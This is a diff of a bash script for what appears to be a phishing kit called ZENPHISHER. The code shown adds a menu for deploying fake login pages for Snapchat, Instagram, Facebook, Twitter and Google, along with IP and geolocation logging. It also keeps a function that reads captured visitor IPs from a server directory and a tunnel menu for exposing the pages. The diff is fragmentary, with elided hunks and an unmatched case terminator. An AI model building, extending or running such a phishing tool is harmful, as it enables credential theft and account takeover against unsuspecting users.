@@ -1,14 +1,28 @@
 #!/bin/bash
 
-# --- Color Variables for Styling ---
-RED="\033[0;31m"
-WHITE="\033[1;37m"
-GREEN="\033[0;32m"
-BLUE="\033[0;34m"
-CYAN="\033[0;36m"
-ORANGE="\033[0;33m"
+clear
+echo -e "\e[1;32m===================================="
+echo -e "      ZENPHISHER - by YOU 😈        "
+echo -e "===================================="
+echo -e "\n\e[1;34mChoose a target to deploy:"
 
-# --- Info Capture Functions ---
+echo -e "1) Snapchat \e[1;33m(crypto design)"
+echo -e "2) Instagram \e[1;33m(crypto design)"
+echo -e "3) Facebook \e[1;33m(crypto design)"
+echo -e "4) Twitter \e[1;33m(crypto design)"
+echo -e "5) Google \e[1;33m(crypto design)"
+echo -e "6) Advanced Settings"
+echo -e "7) Exit\n"
+
+read -p "Option: " opt
+
+# --- Get current timestamp, timezone, and IP geolocation ---
+timestamp=$(date "+%Y-%m-%d %H:%M:%S")
+timezone=$(date +'%Z%z')  # Get the local timezone of the machine
+ip_address=$(curl -s ifconfig.me)  # Getting the public IP address
+geolocation=$(curl -s "http://ip-api.com/json/$ip_address" | jq -r '"City: " + .city + ", Country: " + .country')  # Using ip-api to get geolocation
+
+# --- Log the information to log.txt ---
 capture_ip() {
   IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
   IFS=$'\n'
@@ -129,3 +143,5 @@ custom_url() {
 
 # Run the tunnel menu
 tunnel_menu
+    ;;
+esac
